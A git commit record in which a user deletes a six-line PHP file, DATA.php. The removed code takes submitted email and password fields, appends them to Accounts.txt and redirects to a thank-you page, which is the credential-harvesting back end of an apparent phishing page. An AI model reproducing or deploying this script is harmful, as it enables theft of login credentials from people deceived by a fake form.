9cbde536e837f282358a697c2ddb0199fe02dafd
notflaix <87680144+notflaix@users.noreply.github.com>
2021-12-06 07:05:57 +0800

    Delete DATA.php

--- DATA.php
+++
@@ -1,6 +0,0 @@
-<?php
-					  $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
-					  $fp = fopen("Accounts.txt", "a");
-					  fwrite($fp, "$_POST[mail]:$_POST[pass] \n ");
-					  header ("location:thanks.html");
-					  ?>
